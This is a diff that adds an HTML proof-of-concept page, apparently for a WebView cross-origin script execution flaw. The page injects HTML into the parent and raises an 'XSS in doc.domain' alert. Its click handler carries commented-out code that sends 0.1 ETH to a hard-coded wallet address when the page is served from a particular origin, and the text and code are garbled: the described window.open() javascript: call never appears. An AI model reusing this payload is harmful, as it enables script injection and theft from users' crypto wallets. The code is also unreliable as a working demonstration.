@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+html {
+font-family: sans-serif;
+}
+h1 {
+font-size: 1.4em;
+}
+</style>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<h1>iframe on <span id="originOutput"></span></h1>
+
+<p>
+Tap/click this iframe, which will call http://window.open() with javascript: URL that executes in the parent page context.
+(Observe injected HTML in parent page, and potentially an alert() dialog)
+</p>
+
+<p>Other events which result in user activations consumable by http://window.open() also work, such as focus events.</p>
+
+<p>
+The alert() test is not reliable because if WebChromeClient.onJsAlert() is not defined or returns false, no alert
+dialog box will be shown
+despite PoC working. Other actions are more reliable, such as injecting HTML into the parent page.
+</p>
+
+<script>
+document.getElementById('originOutput').innerText = window.location.origin;
+
+document.body.addEventListener('click', function () {
+var origin = window.location.origin;
+var alertOrigin = 'http://g0ziem.github.io';
+
+// Check if the alert is from the specified origin
+if (origin === alertOrigin) {
+// Send a wallet transaction of 0.1 ETH to address 0x62842A4A9d0f6c56D0F1757E13A8Efdd4E7B8BD2
+// Replace this line with the actual code for sending ETH, as it depends on your wallet and setup
+// Example:
+// web3.eth.sendTransaction({ to: '0x62842A4A9d0f6c56D0F1757E13A8Efdd4E7B8BD2', value: web3.toWei(0.1, 'ether') });
+// Inject HTML into the parent page
+var elem = document.createElement("p");
+elem.innerHTML = "<b>Executed JS in parent origin: " + origin + "</b>";
+document.body.append(elem);
+}
+// Trigger the alert after the transaction if needed
+
+alert("XSS in doc.domain: " + document.domain + ", win.origin: " + origin);
+});
+</script>
+</body>
+
+</html>
